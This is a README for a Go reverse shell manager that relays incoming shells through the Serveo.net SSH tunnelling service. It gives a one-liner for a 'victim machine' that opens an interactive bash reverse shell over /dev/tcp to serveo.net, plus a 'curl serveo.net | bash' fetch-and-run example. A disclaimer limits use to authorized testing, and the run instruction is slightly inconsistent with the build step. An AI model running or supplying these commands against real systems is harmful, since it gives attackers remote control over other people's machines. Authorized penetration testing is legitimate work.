**Go Reverse Shell Manager using Serveo.net**

This is a lightweight reverse shell manager written in Go that leverages [Serveo.net](https://serveo.net) to expose a local port to the internet and receive reverse shells from remote systems. Serveo acts as an SSH-based tunneling service, making it easy to get incoming connections without setting up port forwarding or cloud servers.

### ✦ Features:

* Automatically sets up a Serveo.net tunnel via SSH.
* Listens for incoming reverse shell connections.
* Simple command-line interface.
* Supports multiple sessions (basic).

### ✦ How It Works:

1. The tool opens an SSH tunnel to Serveo.net (e.g., `ssh -R 80:localhost:4444 serveo.net`).
2. The public Serveo subdomain forwards traffic to your local listener port.
3. A remote system connects to the public Serveo address (e.g., `curl serveo.net | bash`).
4. The Go program accepts and manages the reverse shell session.


### 🛠 Build 

```bash
go build rshell.go
```

This command creates an executable file named `rshell`.

### ✦ Example Usage:

```bash
./rshell.go
```

Then on the victim machine:

```bash
bash -c '(exec bash -i &>/dev/tcp/serveo.net/4000 0>&1) &'
```


## ⚠️ Disclaimer
This tool is intended for educational and authorized penetration testing purposes only. Unauthorized access to systems you do not own or have permission to test is illegal and unethical.

**👨‍💻Author:** [İbrahimsql on GitHub](https://github.com/ibrahmsql) ・ [X / Twitter](https://x.com/ibrahimsql)

